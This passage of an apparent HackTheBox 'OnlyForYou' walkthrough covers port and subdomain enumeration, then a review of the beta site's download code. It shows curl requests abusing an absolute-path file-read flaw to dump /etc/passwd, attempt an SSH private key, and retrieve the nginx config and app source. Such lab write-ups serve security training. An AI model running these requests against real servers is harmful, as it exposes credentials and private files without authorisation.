+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://only4you.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 9.41 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There are no extra interesting ports, only port 80 for an http webpage and 22 for ssh once credentials can be acquired.</p>
+<p>Visiting the webpage requires we add <code>only4you.htb</code> to our hosts file:
+/etc/hosts</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10.10.11.210 only4you.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The server is powered by nginx:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ curl -I http://only4you.htb                                            
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">22</span> Apr <span class="m">2023</span> 20:48:01 GMT
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">34125</span>
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="exploring-subdomains">Exploring subdomains</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ gobuster vhost -u http://only4you.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">[+] Url:             http://only4you.htb/
+</span></span><span class="line"><span class="cl">[+] Method:          GET
+</span></span><span class="line"><span class="cl">[+] Threads:         10
+</span></span><span class="line"><span class="cl">[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</span></span><span class="line"><span class="cl">[+] User Agent:      gobuster/3.6
+</span></span><span class="line"><span class="cl">[+] Timeout:         10s
+</span></span><span class="line"><span class="cl">[+] Append Domain:   true
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Starting gobuster in VHOST enumeration mode
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Found: beta.only4you.htb Status: 200 [Size: 2191]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We see an extra subdomain at <code>beta.only4you.htb</code>.
+Viewing the subdomain, we see a beta site, and a button to download source code in a zip file:
+<img src="/post/hackthebox-onlyforyou/Images/Beta.png"
+	width="751"
+	height="307"
+	srcset="/post/hackthebox-onlyforyou/Images/Beta_hu1f028b46a55dc5ab197a47ac64cf1505_16682_480x0_resize_box_3.png 480w, /post/hackthebox-onlyforyou/Images/Beta_hu1f028b46a55dc5ab197a47ac64cf1505_16682_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Beta site"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="587px"
+	
+></p>
+<p>Using burpsuite, we see that the download is performed via GET request to <code>beta.only4you.htb/source</code>.</p>
+<p><img src="/post/hackthebox-onlyforyou/Images/BetaSource.png"
+	width="793"
+	height="251"
+	srcset="/post/hackthebox-onlyforyou/Images/BetaSource_huda0144b98c4d3ad8e401f2e0c895d30c_34159_480x0_resize_box_3.png 480w, /post/hackthebox-onlyforyou/Images/BetaSource_huda0144b98c4d3ad8e401f2e0c895d30c_34159_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="315"
+		data-flex-basis="758px"
+	
+></p>
+<p>If this had been related to a function (i.e: ?download=source), then it might be worth exploring directory traversal techniques.</p>
+<h3 id="analyzing-beta-site-source-code">Analyzing beta site source code</h3>
+<p>Checking the source zip that is given, we see right away that the server is utilizing python:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ unzip source.zip     
+</span></span><span class="line"><span class="cl">Archive:  source.zip
+</span></span><span class="line"><span class="cl">   creating: beta/
+</span></span><span class="line"><span class="cl">  inflating: beta/app.py             
+</span></span><span class="line"><span class="cl">   creating: beta/static/
+</span></span><span class="line"><span class="cl">   creating: beta/static/img/
+</span></span><span class="line"><span class="cl">  inflating: beta/static/img/image-resize.svg  
+</span></span><span class="line"><span class="cl">   creating: beta/templates/
+</span></span><span class="line"><span class="cl">  inflating: beta/templates/400.html  
+</span></span><span class="line"><span class="cl">  inflating: beta/templates/500.html  
+</span></span><span class="line"><span class="cl">  inflating: beta/templates/convert.html  
+</span></span><span class="line"><span class="cl">  inflating: beta/templates/index.html  
+</span></span><span class="line"><span class="cl">  inflating: beta/templates/405.html  
+</span></span><span class="line"><span class="cl">  inflating: beta/templates/list.html  
+</span></span><span class="line"><span class="cl">  inflating: beta/templates/resize.html  
+</span></span><span class="line"><span class="cl">  inflating: beta/templates/404.html  
+</span></span><span class="line"><span class="cl">   creating: beta/uploads/
+</span></span><span class="line"><span class="cl">   creating: beta/uploads/resize/
+</span></span><span class="line"><span class="cl">   creating: beta/uploads/list/
+</span></span><span class="line"><span class="cl">   creating: beta/uploads/convert/
+</span></span><span class="line"><span class="cl">  inflating: beta/tool.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There is an interesting uploads folder, as well as a <code>tool.py</code> file. The very first thing we can do is look at the routes defined in <code>app.py</code>, as this will tell us all the valid pages we can visit.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">cat</span> <span class="n">app</span><span class="o">.</span><span class="n">py</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">route</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/resize&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/convert&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/source&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/list&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/download&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Note it is worth reading the full source code, but for simple reading I selected only the route lines.</p>
+<p>There is a download page as previously discussed, and exploring the code for this route shows us that there have been efforts to mitigate directory traversal techniques:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">download</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">image</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;image&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">posixpath</span><span class="o">.</span><span class="n">normpath</span><span class="p">(</span><span class="n">image</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;..&#39;</span> <span class="ow">in</span> <span class="n">filename</span> <span class="ow">or</span> <span class="n">filename</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;../&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Hacking detected!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/list&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isabs</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;LIST_FOLDER&#39;</span><span class="p">],</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Image doesn</span><span class="se">\&#39;</span><span class="s1">t exist!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/list&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">(</span><span class="ne">TypeError</span><span class="p">,</span> <span class="ne">ValueError</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="n">BadRequest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Moving up a folder with <code>../</code> has been prohibited, but python will often accept absolute paths as well. To check for this, we can simply try to download /etc/passwd:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ curl http://beta.only4you.htb/download -d <span class="s2">&#34;image=/etc/passwd&#34;</span>
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">john:x:1000:1000:john:/home/john:/bin/bash
+</span></span><span class="line"><span class="cl">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span><span class="line"><span class="cl">mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">neo4j:x:997:997::/var/lib/neo4j:/bin/bash
+</span></span><span class="line"><span class="cl">dev:x:1001:1001::/home/dev:/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="using-arbitrary-file-read-to-retrieve-main-site-source-code">Using Arbitrary File Read to retrieve main site source code</h3>
+<p>By defining the absolute path of the file we wish to access, we can still bypass the rudimentary filters placed. Note for later, the system has two users: john and dev.</p>
+<p>Looking for ssh keys, unfortunately we cannot acquire:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">$ curl http://beta.only4you.htb/download -d &#34;image=/home/john/.ssh/id_rsa&#34;
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!doctype html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">en</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Redirecting...<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Redirecting...<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>You should be redirected automatically to the target URL: <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/list&#34;</span><span class="p">&gt;</span>/list<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>. If not, click the link.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In this case, redirection is the result of a file not existing.</p>
+<p>It would be nice if we could view the source code associated with the main website, <code>only4you.htb</code>. To access, we need to find a way to know the folder names and location of files.</p>
+<p>Using nginx configuration files:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ curl http://beta.only4you.htb/download -d &#34;image=/etc/nginx/sites-enabled/default&#34;
+</span></span><span class="line"><span class="cl">server {
+</span></span><span class="line"><span class="cl">    listen 80;
+</span></span><span class="line"><span class="cl">    return 301 http://only4you.htb$request_uri;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">server {
+</span></span><span class="line"><span class="cl">        listen 80;
+</span></span><span class="line"><span class="cl">        server_name only4you.htb;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        location / {
+</span></span><span class="line"><span class="cl">                include proxy_params;
+</span></span><span class="line"><span class="cl">                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">server {
+</span></span><span class="line"><span class="cl">        listen 80;
+</span></span><span class="line"><span class="cl">        server_name beta.only4you.htb;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        location / {
+</span></span><span class="line"><span class="cl">                include proxy_params;
+</span></span><span class="line"><span class="cl">                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here in the proxy_pass segments, we are given the full paths to our web roots:
+<code>/var/www/only4you.htb/</code> and <code>/var/www/beta.only4you.htb/</code>. For python webservers, the main code is usually written as <code>app.py</code> or possibly <code>main.py</code>, however first I wanted to check any <code>git</code> info is available:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">$ curl http://beta.only4you.htb/download -d &#34;image=/var/www/only4you.htb/.git/HEAD&#34;
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!doctype html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">en</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Redirecting...<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Redirecting...<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>You should be redirected automatically to the target URL: <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/list&#34;</span><span class="p">&gt;</span>/list<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>. If not, click the link.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There was nothing here, so we can explore the source code of <code>app.py</code> on the main webpage:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ curl http://beta.only4you.htb/download -d &#34;image=/var/www/only4you.htb/app.py&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Source code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">redirect</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">form</span> <span class="kn">import</span> <span class="n">sendmessage</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">email</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">subject</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;subject&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">message</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">status</span> <span class="o">=</span> <span class="n">sendmessage</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">ip</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Something went wrong!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">status</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;You are not authorized!&#39;</span><span class="p">,</span> <span class="s1">&#39;danger&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s1">&#39;Your message was successfuly sent! We will reply as soon as possible.&#39;</span><span class="p">,</span> <span class="s1">&#39;success&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/#contact&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">page_not_found</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;404.html&#39;</span><span class="p">),</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">server_errorerror</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;500.html&#39;</span><span class="p">),</span> <span class="mi">500</span>
+</span></span><span class="line"><span class="cl">
